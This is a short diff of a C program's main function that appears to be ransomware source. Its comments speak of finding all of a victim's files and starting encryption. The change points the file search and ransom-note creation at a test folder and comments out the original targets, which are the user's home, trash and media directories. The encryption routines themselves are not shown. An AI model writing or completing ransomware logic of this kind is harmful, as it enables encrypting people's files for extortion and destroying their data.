@@ -24,15 +24,19 @@ int main(){
     char * media = get_media_path(username);
     // char * test_path = get_test_path(desktop);
 
-    char * test_path = "/home/tarcisio/tests/";
+    char * test_path = "/home/benson/target/";
+    // printf("Home path: %s\n", trash);
+    // printf("Home path: %s\n", test_path);
+
     /* finding all victim's files */
-    find_files(&files, home);
-    find_files(&files, trash);
-    find_files(&files, media);
+    // find_files(&files, home);
+    // find_files(&files, trash);
+    // find_files(&files, media);
+    find_files(&files, test_path);
 
     /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
-    create_files_desktop(encrypted, files, desktop);
+    create_files_desktop(encrypted, files, test_path);
     
     /* Free the linked lists*/
     // NEED TO DESTROY THE KEYS INSIDE THE LISTS
